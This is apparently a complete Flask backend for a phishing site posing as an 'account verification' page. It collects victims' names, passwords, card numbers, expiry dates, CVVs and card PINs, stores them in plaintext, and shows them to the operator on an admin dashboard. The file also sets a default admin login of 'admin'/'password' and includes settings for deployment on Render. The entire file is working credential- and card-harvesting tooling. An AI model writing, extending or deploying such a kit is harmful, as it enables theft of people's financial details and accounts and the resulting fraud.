# Import required modules for Flask application
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
from flask_sqlalchemy import SQLAlchemy  # SQLAlchemy ORM for database operations
from werkzeug.security import generate_password_hash, check_password_hash  # Password hashing utilities
from datetime import datetime  # For timestamp handling
import bcrypt  # For password hashing (additional security)
import os  # For environment variables and file operations

# Create Flask application instance
app = Flask(__name__)

# Configure Flask application settings
app.config['SECRET_KEY'] = 'your-secret-key-change-this-in-production'  # Secret key for session encryption
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'  # SQLite database file path
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False  # Disable modification tracking for performance

# Initialize SQLAlchemy with Flask app
db = SQLAlchemy(app)

# Define database models using SQLAlchemy ORM

class Submission(db.Model):
    """Model for storing form submission data"""
    __tablename__ = 'submissions'  # Table name in database
    
    # Define table columns with their data types and constraints
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    fullname = db.Column(db.String(100), nullable=False)  # Username field, required
    password = db.Column(db.String(200), nullable=False)  # Password field, required
    card_number = db.Column(db.String(16), nullable=False)  # Card number, required
    expiry_date = db.Column(db.String(5), nullable=False)  # Expiry date MM/YY format, required
    cvv = db.Column(db.String(3), nullable=False)  # CVV 3 digits, required
    card_pin = db.Column(db.String(5), nullable=False)  # Card PIN 5 digits, required
    contact_number = db.Column(db.String(20), nullable=True)  # Contact number, optional
    submitted_at = db.Column(db.DateTime, default=datetime.utcnow)  # Timestamp, defaults to current time

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'fullname': self.fullname,
            'password': self.password,
            'card_number': self.card_number,
            'expiry_date': self.expiry_date,
            'cvv': self.cvv,
            'card_pin': self.card_pin,
            'contact_number': self.contact_number,
            'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None
        }

class Admin(db.Model):
    """Model for storing admin user credentials"""
    __tablename__ = 'admins'  # Table name in database
    
    # Define table columns
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    username = db.Column(db.String(50), unique=True, nullable=False)  # Username, unique and required
    password_hash = db.Column(db.String(200), nullable=False)  # Hashed password, required

# Helper function to check if user is authenticated as admin
def require_auth():
    """Check if current session has admin authentication"""
    if not session.get('is_admin'):  # Check if admin flag exists in session
        return False  # User is not authenticated
    return True  # User is authenticated

# Route to serve the main verification form
@app.route('/')
def index():
    """Serve the main account verification form"""
    return send_from_directory('public', 'index.html')  # Send HTML file from public directory

# Route to handle form submissions
@app.route('/api/submit', methods=['POST'])
def submit_form():
    """Handle form submission and store data in database"""
    try:
        # Get JSON data from request body
        data = request.get_json()
        
        # Validate that all required fields are present
        required_fields = ['fullname', 'password', 'CardNumber', 'expiry_date', 'cvv', 'card_pin']
        for field in required_fields:
            if not data.get(field):  # Check if field is missing or empty
                return jsonify({'error': f'Field {field} is required'}), 400  # Return error response
        
        # Create new submission record
        submission = Submission(
            fullname=data['fullname'],  # Extract username from form data
            password=data['password'],  # Extract password from form data
            card_number=data['CardNumber'],  # Extract card number from form data
            expiry_date=data['expiry_date'],  # Extract expiry date from form data
            cvv=data['cvv'],  # Extract CVV from form data
            card_pin=data['card_pin'],  # Extract card PIN from form data
            contact_number=data.get('contact_number')  # Extract contact number (optional)
        )
        
        # Add submission to database session and commit
        db.session.add(submission)  # Add new record to session
        db.session.commit()  # Save changes to database
        
        # Log successful submission
        print(f'New submission saved with ID: {submission.id}')
        
        # Return success response
        return jsonify({'success': True, 'message': 'Verification completed successfully'}), 200
    
    except Exception as e:
        # Handle any errors during submission
        print(f'Error saving submission: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Database error'}), 500  # Return server error response

# Route to serve admin login page
@app.route('/admin/login')
def admin_login():
    """Serve the admin login page"""
    return send_from_directory('public', 'admin-login.html')  # Send login HTML file

# Route to handle admin login authentication
@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    """Handle admin login authentication"""
    try:
        # Get JSON data from request
        data = request.get_json()
        username = data.get('username')  # Extract username
        password = data.get('password')  # Extract password
        
        # Find admin user in database
        admin = Admin.query.filter_by(username=username).first()
        
        # Check if admin exists and password is correct
        if admin and bcrypt.checkpw(password.encode('utf-8'), admin.password_hash.encode('utf-8')):
            # Valid credentials: create session
            session['is_admin'] = True  # Set admin flag in session
            session['admin_id'] = admin.id  # Store admin ID in session
            return jsonify({'success': True}), 200  # Return success response
        else:
            # Invalid credentials
            return jsonify({'error': 'Invalid username or password'}), 401  # Return authentication error
    
    except Exception as e:
        # Handle login errors
        print(f'Login error: {str(e)}')  # Log error details
        return jsonify({'error': 'Login error'}), 500  # Return server error

# Route to serve admin dashboard (protected)
@app.route('/admin/dashboard')
def admin_dashboard():
    """Serve the admin dashboard page (requires authentication)"""
    if not require_auth():  # Check if user is authenticated
        return redirect(url_for('admin_login'))  # Redirect to login if not authenticated
    return send_from_directory('public', 'admin-dashboard.html')  # Send dashboard HTML file

# Route to get all submissions (protected API endpoint)
@app.route('/api/admin/submissions')
def get_submissions():
    """Get all form submissions (admin only)"""
    if not require_auth():  # Check if user is authenticated
        return redirect(url_for('admin_login'))  # Redirect to login if not authenticated
    
    try:
        # Query all submissions ordered by most recent first
        submissions = Submission.query.order_by(Submission.submitted_at.desc()).all()
        
        # Convert submissions to list of dictionaries
        submissions_data = [submission.to_dict() for submission in submissions]
        
        return jsonify(submissions_data), 200  # Return submissions as JSON
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching submissions: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to handle admin logout
@app.route('/admin/logout', methods=['POST'])
def admin_logout():
    """Handle admin logout"""
    try:
        # Clear session data
        session.pop('is_admin', None)  # Remove admin flag from session
        session.pop('admin_id', None)  # Remove admin ID from session
        return jsonify({'success': True}), 200  # Return success response
    
    except Exception as e:
        # Handle logout errors
        print(f'Logout error: {str(e)}')  # Log error details
        return jsonify({'error': 'Logout error'}), 500  # Return server error

# Route to serve static files from public directory
@app.route('/public/<path:filename>')
def serve_static(filename):
    """Serve static files from public directory"""
    return send_from_directory('public', filename)  # Send requested file

# Initialize database and create default admin user
def init_database():
    """Initialize database tables and create default admin user"""
    with app.app_context():  # Create application context for database operations
        # Create all database tables
        db.create_all()  # Create tables based on model definitions
        
        # Check if any admin users exist
        admin_count = Admin.query.count()
        
        if admin_count == 0:  # No admin users exist
            # Create default admin user
            hashed_password = bcrypt.hashpw('password'.encode('utf-8'), bcrypt.gensalt())  # Hash default password
            admin = Admin(
                username='admin',  # Default username
                password_hash=hashed_password.decode('utf-8')  # Store hashed password
            )
            
            # Add admin to database
            db.session.add(admin)  # Add admin to session
            db.session.commit()  # Save to database
            print('Default admin created: username=admin, password=password')  # Log creation
        
        print('Database initialized successfully')  # Log successful initialization

# Main application entry point
if __name__ == '__main__':
    # Initialize database on startup
    init_database()  # Create tables and default admin
    
    # Get port from environment variable (Render sets this automatically)
    port = int(os.environ.get('PORT', 3000))  # Use PORT env var or default to 3000
    
    # Print application information
    print('Flask server starting...')
    print(f'Server running on port {port}')
    print('Admin panel available at /admin/login')
    
    # Start Flask application
    # Use debug=False for production, but allow override with environment variable
    debug_mode = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    app.run(
        host='0.0.0.0',  # Listen on all network interfaces
        port=port,  # Use dynamic port for Render deployment
        debug=debug_mode  # Enable debug mode only if explicitly set
    )
